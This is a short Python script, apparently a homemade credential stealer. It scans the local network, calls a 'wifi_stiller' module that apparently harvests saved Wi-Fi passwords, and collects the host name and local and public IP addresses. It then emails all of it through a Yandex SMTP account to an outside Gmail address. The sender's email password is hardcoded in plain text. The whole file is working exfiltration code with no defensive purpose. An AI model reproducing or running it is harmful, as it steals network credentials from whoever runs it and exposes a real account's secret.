import socket
import smtplib
from getpass import getpass
from requests import get
import scan as sc
import wifi_stiller as wf

sc.get_gateway_win()
sc.get_ip_mac_network(sc.local_ipv4())
proc = sc.print_list(sc.get_ip_mac_network(f'{sc.local_ipv4().split(".")[0]}.{sc.local_ipv4().split(".")[1]}.{sc.local_ipv4().split(".")[2]}.1/24'))

wi_fi_proc = wf.still()

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org/').text

email = 'ibrashos@yandex.ru'
password = 'ceujuxgivahidsat'
dest_email = 'ibrashos@gmail.com'
subject = 'IP'
email_text = f'HOST: {hostname}\nLocal IP: {local_ip}\nGlobal IP: {public_ip}\n{wi_fi_proc}\n{proc}'
print(email_text)
message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email,dest_email,subject,email_text)

server = smtplib.SMTP_SSL('smtp.yandex.com')
server.set_debuglevel(1)
server.ehlo(email)
server.login(email, password)
server.auth_plain()
server.sendmail(email, dest_email, message)
server.quit()


# print(f'HOST: {hostname}')
# print(f'Local IP: {local_ip}')
# print(f'Global IP: {public_ip}')

